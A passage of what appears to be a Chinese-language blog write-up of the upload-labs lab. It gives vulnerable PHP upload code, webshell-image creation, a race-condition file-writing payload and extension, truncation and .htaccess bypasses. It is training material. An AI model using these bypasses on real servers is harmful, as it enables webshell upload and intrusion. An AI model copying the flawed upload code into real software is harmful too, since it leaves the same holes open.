(isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123; </span><br><span class=\"line\">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];   //&#x27;upload_file&#x27;是数组，通过[]取值</span><br><span class=\"line\">        $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class=\"line\">        if (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class=\"line\">            $is_upload = true;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">    function checkFile() &#123;</span><br><span class=\"line\">        var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class=\"line\">        if (file == null || file == &quot;&quot;) &#123;</span><br><span class=\"line\">            alert(&quot;请选择要上传的文件!&quot;);</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //定义允许上传的文件类型</span><br><span class=\"line\">        var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class=\"line\">        //提取上传文件的类型</span><br><span class=\"line\">        var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class=\"line\">        //判断上传文件类型是否允许上传</span><br><span class=\"line\">        if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class=\"line\">            var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class=\"line\">            alert(errMsg);</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>method 1. 抓包，上传后缀改为 jpg 的 php，抓包后修改后缀为 php</p>\n<p>method 2. 前端 JS 验证，浏览器关闭 js</p>\n</blockquote>\n<p>Pass02 检测 MIME</p>\n<p>BP 修改 Content-Type: image/jpeg（image/png，image/gif）</p>\n<p>利用 copy 和成木马图片</p>\n<p>copy xxxx.jpg /b + test.php /a test1.jpg</p>\n<p>Pass03</p>\n<p>通过上传 php3,php5,phtml 绕过</p>\n<p>上传 php3 需要在 Apache 配置文件中增加解析 php3,php5,phtml, 使 Apache 解析这些文件</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#<span class=\"title class_\">AddType</span> text/html .<span class=\"property\">shtml</span></span><br><span class=\"line\"><span class=\"title class_\">AddoutputFilter</span> <span class=\"variable constant_\">INCLUDES</span> .<span class=\"property\">shtml</span></span><br><span class=\"line\"><span class=\"title class_\">AddType</span> application/x-httpd-php .<span class=\"property\">php</span> .<span class=\"property\">phtml</span> .<span class=\"property\">php3</span></span><br></pre></td></tr></table></figure>\n<p>#asp 可以通过 asa 和 cer 绕过</p>\n<p>Pass04</p>\n<p>.htaccess 实现 php 伪静态</p>\n<p>.htaccess 文件夹内文件都会被当做 php 解析</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">SetHandler</span> application/x-httpd-php   <span class=\"comment\">//将目录下所有文件都作为php解析</span></span><br></pre></td></tr></table></figure>\n<p>或使用 Apache 解析漏洞</p>\n<p>test.php.x</p>\n<p>预防：使用以下代码使得上传后无法解析</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641700272045-7fc11c94-5bb3-4087-a010-94cf9230bbf7.png\" alt=\"img\"></p>\n<p>Pass-04 过滤代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = null;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (isset(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = array(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.php1&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.pHp1&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.ini&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);//删除文件名末尾的点</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);//分割取后缀</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); //转换为小写</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);//去除字符串::<span class=\"variable\">$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); //收尾去空</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Pass05</p>\n<p>PhP 通过大小写绕过</p>\n<p>只在 Windows 下使用，因为 Windows 不区分大小写</p>\n<p>Pass06</p>\n<p>在提交时在文件末尾加空格绕过后缀检测，Windows 服务端会自动去除，但 php 可以识别空格</p>\n<p>通过抓包修改</p>\n<p>Pass07</p>\n<p>后缀加.，Windows 忽略文件后的.</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641701454141-fc96f35c-12db-4bb3-a9b5-ccbc57e77c58.png\" alt=\"img\"></p>\n<p>Pass08</p>\n<p>当从 Windows shell 命令行指定创建文件时，流的完整名称为 “<strong>filename</strong>:<strong>stream name</strong>:<strong>stream type</strong>”，如示例中所示： “myfile.txt:stream1:$DATA”</p>\n<p>::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>数据流。默认数据流没有名称。对</mtext><mi>N</mi><mi>T</mi><mi>F</mi><mi>S</mi><mtext>格式下的一个文件而言，至少包含一个流，即</mtext><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mtext>流（其</mtext><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>m</mi><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi><mtext>为</mtext></mrow><annotation encoding=\"application/x-tex\">DATA  数据流。 默认数据流没有名称。对NTFS格式下的一个文件而言，至少包含一个流，即data流（其stream type为</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">据</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">。</span><span class=\"mord cjk_fallback\">默</span><span class=\"mord cjk_fallback\">认</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">据</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">没</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">称</span><span class=\"mord cjk_fallback\">。</span><span class=\"mord cjk_fallback\">对</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord cjk_fallback\">格</span><span class=\"mord cjk_fallback\">式</span><span class=\"mord cjk_fallback\">下</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">而</span><span class=\"mord cjk_fallback\">言</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">至</span><span class=\"mord cjk_fallback\">少</span><span class=\"mord cjk_fallback\">包</span><span class=\"mord cjk_fallback\">含</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">即</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">（</span><span class=\"mord cjk_fallback\">其</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">为</span></span></span></span> DATA），data 流是文件的主流，默认的 data 流其 stream name 为空。默认一个文件如果被指定了流，而该流没有 stream type 的话会在存储时自动添加 $DATA。</p>\n<p>在 window 的时候如果文件名 + <code>&quot;::$DATA&quot;</code>  会把 <code>::$DATA</code>  之后的数据当成文件流处理，不会检测后缀名，且保持 <code>::$DATA</code>  之前的文件名</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641701582526-a5e593cd-a5a6-4472-8185-b8c142d207ae.png\" alt=\"img\"></p>\n<p>php 开发模式下 php -S localhost:9090           php 版本 &lt; 7</p>\n<p>localhost:9090/web.php.  会造成任意文件下载和源码读取</p>\n<p>localhost:9090/web.PHP  源码读取</p>\n<p>Pass09</p>\n<p><code>test.php. .   </code></p>\n<p><code>test.php. .     </code>   // 最后还有一个空格</p>\n<p>trim 两次，去 dot 一次，剩下一个点绕过</p>\n<p>Pass10</p>\n<p>后缀被替换为空</p>\n<p>teat.pphphp</p>\n<p>str_ireplace 可以连续过滤多次，比如 phpphp</p>\n<p>test11</p>\n<p>%00 截断 (get 截断) 文件可控</p>\n<p>PHP 底层用 c 语言，c 语言中 \\0 是结束符</p>\n<p>在 PHP 中 get 方法使用 %00 进行截断，而 get 是 url 传参，url 解码后，%00 就是 \\0</p>\n<p>截断后原本的文件名被截断导致随机数被丢失</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$img_path = $_GET[<span class=\"string\">&#x27;save_path&#x27;</span>].<span class=\"string\">&quot;/&quot;</span>.rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.$file_ext;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641715548691-bb017a2c-3516-48af-ab83-13a2cf1828ca.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221025161153164.png\" alt=\"image-20221025161153164\"></p>\n<p>截断条件 PHP&lt;5.3.29 GPC 关闭</p>\n<p>php%00 截断</p>\n<p>1. 上传时路径可控，使用 00 截断</p>\n<p>2. 文件下载时，00 截断绕过白名单检查</p>\n<p>3. 文件包含时，00 截断后面限制 (主要是本地包含时)</p>\n<p>4. 其它与文件操作有关的地方都可能使用 00 截断。</p>\n<p>Pass12</p>\n<p>post 截断</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641716003160-187aa0eb-ac1d-4b9d-8250-dac1ac8499aa.png\" alt=\"img\"></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641715928171-812d6b71-ffa2-47ac-afab-5e5577c11eb3.png\" alt=\"img\"></p>\n<p>25 改为 00</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641715981547-19efbd93-4201-4301-91e8-916dbca04d31.png\" alt=\"img\"></p>\n<p>或者将 %00urldecode</p>\n<p>Pass 13 文件包含</p>\n<p>只读前两个字节</p>\n<p>1. 上传图片码</p>\n<p>copy xxxx.jpg /b + test.php /a test1.jpg</p>\n<p>2. 文件包含，他写了一个 include.php 作为文件包含</p>\n<?php \n\ninclude demo.jpg\n\n?>\n<p>会将包含的文件当做 PHP 执行</p>\n<p>include 时文件不能可控</p>\n<p>127.0.0.1/include.php?file=./upload/1.jpg</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">/*</span><br><span class=\"line\">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class=\"line\">*/</span><br><span class=\"line\">header(<span class=\"string\">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(isset(<span class=\"variable\">$file</span>))&#123;</span><br><span class=\"line\">    include <span class=\"variable\">$file</span>;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    show_source(__file__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>Pass14</p>\n<p>==Pass13</p>\n<p>Pass16</p>\n<p>重新生成文件导致木马无效</p>\n<p>通过 payload 将木马插入到没有被打乱的部分，实现木马</p>\n<p>png 和 jpg 都会有不被打乱的部分</p>\n<p>通过脚本找到没有被打乱的部分</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjY1NyN0b2MtMg==\">https://xz.aliyun.com/t/2657#toc-2</span></p>\n<p>Pass17</p>\n<p>时间竞争 文件先上传后判断，导致上传后出现，一旦出现资源占用时，rename 操作被中断，可以生成</p>\n<p>上传一下文件，通过 intruder 连续上传，web.php</p>\n<p><code>&lt;?php fputs(fopen('../haha.php','w'),'&lt;?php phpinfo(); ?&gt;');&gt;</code></p>\n<p>在访问 web.php，访问时抓包，送到 intruder，一旦访问到，则会在上级目录生成 haha.php</p>\n<p>解决：先判断，如果后缀不对别上传</p>\n<p>写到上级目录防止递归删除文件夹中全部内容，如果不是递归删除，生成在当前目录也行</p>\n<p>Pass19</p>\n<p><code>.</code>  截断</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzMwNjU0Ny9hcnRpY2xlL2RldGFpbHMvMTIwMDQzMDMy\">https://blog.csdn.net/weixin_47306547/article/details/120043032</span></p>\n<h2 id=\"文件上传防御与绕过\"><a class=\"markdownIt-Anchor\" href=\"#文件上传防御与绕过\">#</a> 文件上传防御与绕过</h2>\n<blockquote>\n<p>前端验证</p>\n<p>白名单过滤后缀 .gif|.jpg|.png</p>\n<p>content-type 检测 image/jpeg  image/png  image/gif</p>\n<p>黑名单过滤：限制 php，asp，jsp，jspx</p>\n<p>exif_imagetype 文件头检测</p>\n<p>二次渲染</p>\n<p>先判断在上传</p>\n<p>随机方式重命名</p>\n<p>文件夹取消执行权限</p>\n<p>在临时文件夹解压</p>\n</blockquote>\n<blockquote>\n<p>绕过办法：</p>\n<p>1. 文件大小写绕过（Php ，PhP pHp，等）</p>\n<p>2. 黑白名单绕过（php，php2，php3，php5，phtml，asp，aspx，ascx，ashx，cer，asa，jsp，jspx）cdx，\\x00hh\\x46php</p>\n<p>3. 特殊文件名绕过<br>\n 1）修改数据包里的文件名为 test.php 或 test.asp_(下划线是空格) 由于这种命名格式在<br>\n windows 系统里是不允许的，所以在绕过上传之后 windows 系统会自动去掉。点和空格。Linux 和<br>\n Unix 中没有这个特性。<br>\n2）::$DATA (php 在 windows 的时候如果文件名 +&quot;::DATA&quot; 会把::DATA 之后的数据当作文件流处<br>\n理，不会检测后缀名，且保持 &quot;::DATA&quot; 之前的文件名，其目的就是不检查后缀名)</p>\n<p>4.0x00 截断绕过（5.2 C 语言中将 \\0 当作字符串的结尾）</p>\n<p>5.htaccess 文件攻击（结合黑名单攻击）</p>\n<p>6. 解析绕过</p>\n<p>7. 修改 content-type 字段</p>\n<p>8. 关闭浏览器 js</p>\n<p>9. 使用图片马配合文件包含</p>\n<p>10. 修改文件头</p>\n<p>JPG<br>\n <code>FF D8 FF E0 00 10 4A 46 49 46</code></p>\n<p>GIF<br>\n <code>47 49 46 38 39 61</code></p>\n<p>(相当于文本的 GIF89a)</p>\n<p>PNG<br>\n <code>89 50 4E 47</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/9113969-cf4c7c27a2bea500.png\" alt=\"img\"></p>\n</blockquote>\n<h2 id=\"phpiiswindows-文件上传\"><a class=\"markdownIt-Anchor\" href=\"#phpiiswindows-文件上传\">#</a> php+IIS+Windows 文件上传</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//U-Mail demo ...</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;filename&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&quot;/[^\\w]/i&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$filename</span>);  <span class=\"comment\">//过滤除了a-zA-Z0-9以外的内容</span></span><br><span class=\"line\">    <span class=\"variable\">$upfile</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];    <span class=\"comment\">//file中name</span></span><br><span class=\"line\">    <span class=\"variable\">$upfile</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;;&#x27;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"variable\">$upfile</span>);   <span class=\"comment\">//过滤; 防止截断</span></span><br><span class=\"line\">    <span class=\"variable\">$upfile</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&quot;/[^(\\w|\\:|\\$|\\.|\\&lt;|\\&gt;)]/i&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$upfile</span>);   <span class=\"comment\">//只能出现a-zA-Z0-9:$.&lt;&gt;</span></span><br><span class=\"line\">    <span class=\"variable\">$tempfile</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$ext</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"title function_ invoke__\">get_extension</span>(<span class=\"variable\">$upfile</span>)); </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$ext</span>,<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;php&#x27;</span>,<span class=\"string\">&#x27;php3&#x27;</span>,<span class=\"string\">&#x27;php5&#x27;</span>)))&#123;   <span class=\"comment\">//过滤php35</span></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Warning ! File type error..&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;asp&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;asa&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;cer&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;cdx&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;aspx&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;htaccess&#x27;</span>) <span class=\"variable\">$ext</span> = <span class=\"string\">&#x27;file&#x27;</span>;</span><br><span class=\"line\">  <span class=\"comment\">//$savefile = &#x27;upload/&#x27;.$upfile;</span></span><br><span class=\"line\">    <span class=\"variable\">$savefile</span> = <span class=\"string\">&#x27;upload/&#x27;</span>.<span class=\"variable\">$filename</span>.<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$ext</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$tempfile</span>,<span class=\"variable\">$savefile</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Success upload..path :&#x27;</span>.<span class=\"variable\">$savefile</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Upload failed..&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_extension</span>(<span class=\"params\"><span class=\"variable\">$file</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$file</span>, <span class=\"title function_ invoke__\">strrpos</span>(<span class=\"variable\">$file</span>, <span class=\"string\">&#x27;.&#x27;</span>)+<span class=\"number\">1</span>));</span><br><span 